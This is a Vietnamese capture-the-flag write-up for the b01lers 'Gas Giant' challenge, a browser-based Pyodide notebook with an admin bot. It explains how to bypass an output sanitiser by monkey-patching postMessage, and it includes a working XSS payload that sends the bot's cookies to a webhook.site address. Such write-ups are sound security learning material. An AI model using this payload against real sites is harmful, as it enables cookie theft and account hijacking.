

# Gas Giant (Web/Client-side) - b01lers CTF

## 1. Challenge Description
Website giả lập Jupyter Notebook rút gọn chạy bằng **Pyodide** (Python thực thi trong trình duyệt thông qua WebAssembly). 
Người dùng có thể upload file notebook và trang web sinh ra link notebook để chạy 
Trang web còn có chức năng cho phép người dùng báo cáo link độc hại cho admin 

![Gas_Page](../../assets/images/ctf/b01lers/gas_page.png)


## 2. Vulnerability Analysis
Phân tích mã nguồn chúng ta thấy có file bot.js, điều này gợi ý có thể sẽ có lỗ hỗng XSS của trang web 
Phân tích mã nguồn bot.js
```javascript
export async function visit(url: string) {
    const browser = await puppeteer.launch({
        args: ['--no-sandbox', '--disable-gpu', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();

    await browser.setCookie({ name: 'flag', value: 'bctf{fake_flag}', domain: 'localhost' });

    console.log('Visiting:', url);

    await page.goto(url);

    // Wait for the run button to load, then run the cell
    await page.locator('button.cursor-pointer.text-right.px-1').setTimeout(20000).click();
    await sleep(5000);

    console.log('Done visiting :D')
}
```
Con bot này sẽ chỉ set flag cookie chỉ khi nó truy cập đường dẫn URL từ domain localhost, sau khi truy cập nó sẽ tìm kiếm class `cursor-pointer text-right px-1` và click vào đó

Kiểm tra trong mã html và css, phát hiện được đây là class của nút run cell

```typescript
export default function StyledNotebook(props: { notebook: Notebook, className: string }) {
    return (
        <JupyterNotebook
            notebook={props.notebook}
            remarkPlugins={[remarkMath]}
            ...
            runButtonClassName="cursor-pointer text-right px-1"
        />
    )
}
```

Kiểm tra chức năng upload notebook, ta thấy có thể upload file notebook lên và trang web sẽ trả về link của notebook đó, kết hợp với manh mối về bot, có thể suy luận được tồn tại lỗ hỗng XSS khi thực thi code trong cell 

Kiểm tra thêm chức năng report link của web, trong mã nguồn, ta thấy nó gọi tới API /report 

```javascript
 const res = await fetch('/report', {
                        method: 'POST',
                        body: JSON.stringify({ url }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                    const data = await res.json();

                    if (res.ok) {
                        setMessage(data.message);
                        setError('');
                    } else {
                        setError(data.message);
                        setMessage('');
                    }

```
API này sẽ gọi con bot truy cập vào đường link đã nhận từ người dùng 

```typescript
import { visit } from './bot.js';
...
app.post('/report', async (req, res) => {
    ...
    void visit(url).catch((e) => console.log('Visit failed:', e));
    res.status(200).send({ message: 'The admin is visiting your URL.' })
})
    ...
```
Đoán được chuỗi tấn công có thể sẽ xảy ra như sau: Khai thác lỗ hỗng XSS từ Cell của notebook -> Upload Notebook chứa 1 cell duy nhất có đoạn mã thực thi việc gửi flag về server của attacker -> Lấy link notebook -> Report link cho admin -> Bot truy cập vào link -> Lấy flag từ server 

Câu hỏi đặt ra bây giờ là làm sao để tìm kiếm lỗ hỗng XSS của cell trong notebook và khai thác như thế nào ?

Kiểm tra mã nguồn frontend tại component `CodeCellOutput`, ta phát hiện lỗi XSS thông qua việc sử dụng thuộc tính `dangerouslySetInnerHTML` để hiển thị kết quả HTML từ các cell của notebook:

```javascript
if (trusted && mimes['text/html']) return (
    <div dangerouslySetInnerHTML={{ __html: mimes['text/html'] }} />
)
```
Ở đây có sử dụng biến trusted để kiểm tra tính an toàn của nội dung HTML, nếu trusted là true thì sẽ hiển thị nội dung HTML, ngược lại thì sẽ không hiển thị, tuy nhiên website lại để giá trị mặc định cho trusted là true 

Thử insert mã XSS thông qua việc sử dụng thuộc tính `dangerouslySetInnerHTML` để hiển thị kết quả HTML từ các cell của notebook:

```python
from IPython.display import display, HTML

# Payload test XSS bằng thẻ img (khi ảnh lỗi sẽ chạy alert)
test_payload = '<img src=x onerror="alert(\'XSS')">'

display(HTML(test_payload))

```

Tuy nhiên, tác giả đã cài đặt một cơ chế phòng thủ bên trong Web Worker (nơi thực thi Python). Mọi kết quả từ Python trả về (`execute_result` và `display_data`) đều bị ghi đè bằng một thông báo an toàn:

```javascript
const publishExecutionResult = (prompt_count, data, metadata) => {
    self.postMessage({
        id,
        output_type: 'execute_result',
        data: { 'text/plain': '<'execute_result' output disabled due to security reasons>' },
        // ...
    });
};
```
Cơ chế này ngăn chặn việc in trực tiếp mã HTML/JS độc hại từ Python ra frontend.

## 3. Exploitation Strategy

> **Ý tưởng bypass:** Ta cần tìm cách nào đó có thể thay đổi kết quả đầu ra, hoặc một cách nào đó để tác động vào hàm postMessage, một kĩ thuật có thể làm được điều này là Monkey Patching 

Monkey Patching là một kĩ thuật lập trình cho phép chúng ta thay đổi, tác động tới mã nguồn của class, thư viện, hoặc module trong quá trình thực thi mà không cần cập nhật tới mã nguồn gốc

Về cơ bản, chúng ta có thể định nghĩa phương thức mới với hành vi khác phương thức cũ và gán phương thức mới thay thế phương thức cũ, để trong quá trình thực thi thì phương thức mới sẽ thực thi đè lên phương thức cũ

Các bước để bypass và xây dựng payload như sau

### Bước 1: Monkey Patching `postMessage`
Vì mã Python chạy trong cùng môi trường Web Worker với script bảo mật của tác giả, chúng ta có thể sử dụng thư viện `js` của Pyodide để can thiệp vào Javascript global (`self`).

Ý tưởng là **ghi đè (Hooking)** hàm `self.postMessage`. Khi hàm bảo vệ của tác giả gọi `postMessage` để gửi kết quả "đã làm sạch" ra ngoài, hàm giả mạo của chúng ta sẽ chặn lại, tráo đổi nội dung thành mã XSS, rồi mới gửi đi thật sự.

### Bước 2: Bypass innerHTML Script Execution
Vì React sử dụng `innerHTML`, các thẻ `<script>` sẽ không được thực thi. Ta sử dụng thẻ `<img>` với thuộc tính `onerror` để kích hoạt Javascript lấy cookie.

### Bước 3: Cookie Scope & Localhost
Bot cấu hình cookie `flag` với domain là `localhost`. Do đó, ta phải lừa bot truy cập thông qua `http://localhost:3000` thay vì tên miền bên ngoài để trình duyệt gửi kèm cookie trong request.

## 4. Final Payload

Truy cập vào webhook để lấy đường link url để "hứng" flag 
Tạo một file `exploit.ipynb` với một cell duy nhất chứa nội dung sau:

```python
import js
js_code = f"""
const origPostMessage = self.postMessage;
self.postMessage = function(msg) {{
    if (msg.output_type === 'execute_result' || msg.output_type === 'display_data') {{
        msg.output_type = 'display_data';
        msg.data = {{
            'text/html': '<img src=x onerror="fetch(\\'https://webhook.site/29ab6ede-dc70-4898-8d91-07a2987e2126?cookie=\\' + encodeURIComponent(document.cookie))">'
        }};
    }}
    origPostMessage.call(this, msg);
}};
"""
js.eval(js_code)
"A"
```

## 5. Execution
1. Upload file `exploit.ipynb` lên hệ thống.
2. Lấy URL chia sẻ được sinh ra (URL chứa tham số `d=` là chuỗi Base64 của notebook).
3. Thay đổi domain và port trong URL thành: `http://localhost:3000/render?d=...`
4. Gửi URL này cho Bot thông qua chức năng Report/Security.
5. Bot truy cập, bấm nút **Run**, mã Python thực thi và kích hoạt bẫy `postMessage`.
6. XSS thực thi trên trình duyệt bot, gửi `document.cookie` về Webhook.

## 6. Conclusion
Webhook thu thập được flag khi bot nhấn vào nút run

![Gas_Result](../../assets/images/ctf/b01lers/gas0.png)

Ta decode base64 là sẽ lấy được flag

![Gas_Result](../../assets/images/ctf/b01lers/gas.png)

---

**Key takeaways:**
*   **Monkey Patching** trong môi trường Web Worker là kỹ thuật mạnh mẽ để bypass các cơ chế bảo mật tầng ứng dụng.
*   Hiểu rõ về **Cookie Domain Scope** là yếu tố then chốt để khai thác thành công các bài tập giả lập bot Puppeteer.